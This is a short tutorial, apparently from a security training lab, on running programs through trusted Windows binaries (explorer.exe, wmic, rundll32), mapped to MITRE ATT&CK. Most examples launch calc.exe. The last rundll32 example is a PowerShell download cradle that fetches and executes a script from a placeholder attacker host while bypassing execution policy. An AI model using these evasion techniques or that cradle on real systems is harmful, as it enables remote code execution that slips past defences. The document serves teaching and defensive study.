# File Execution via Living Off the Land Binaries (LOLBins)

This document demonstrates various methods for executing binaries within Windows by abusing legitimate system binaries. These techniques, based on the MITRE ATT&CK framework, are known as **Signed Binary Proxy Execution** or **Indirect Command Execution**. Attackers leverage trusted system tools to spawn malicious payloads, helping to evade defensive controls.

---

## File Explorer

**File Explorer** (`explorer.exe`) is the default file manager for Windows. It can be abused to execute other `.exe` files, making it useful for indirect command execution. This technique launches payloads from a trusted parent process.

- **Locations:**
    - `C:\Windows\explorer.exe` (64-bit)
    - `C:\Windows\SysWOW64\explorer.exe` (32-bit)

**Example:**

```cmd
C:\Users\thm> explorer.exe /root,"C:\Windows\System32\calc.exe"
```

This command launches Calculator (`calc.exe`) as a child process of `explorer.exe`.

---

## WMIC

**Windows Management Instrumentation Command-line (WMIC)** is a utility for managing Windows components. It can also be used to execute binaries, aiding in evasion.

- **MITRE ATT&CK:** Signed Binary Proxy Execution (T1218)

**Example:**

```cmd
C:\Users\thm> wmic.exe process call create calc
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
                ProcessId = 1740;
                ReturnValue = 0;
};
```

This command creates a new process for `calc.exe`.

---

## Rundll32

**Rundll32** is a built-in tool for loading and running DLL files. It can be abused to execute arbitrary payloads, including JavaScript and PowerShell scripts.

- **Locations:**
    - `C:\Windows\System32\rundll32.exe` (64-bit)
    - `C:\Windows\SysWOW64\rundll32.exe` (32-bit)
- **MITRE ATT&CK:** Signed Binary Proxy Execution: Rundll32 (T1218)

**Example: Execute calc.exe using JavaScript:**

```cmd
C:\Users\thm> rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

This command uses `rundll32.exe` to execute JavaScript that launches `calc.exe`.

**Example: Execute a PowerShell script via JavaScript:**

```cmd
C:\Users\thm> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```

This command downloads and executes a remote PowerShell script in memory.

---

> **Note:** These techniques are commonly used for evasion and persistence by attackers. Always use them in authorized environments for learning and testing purposes only.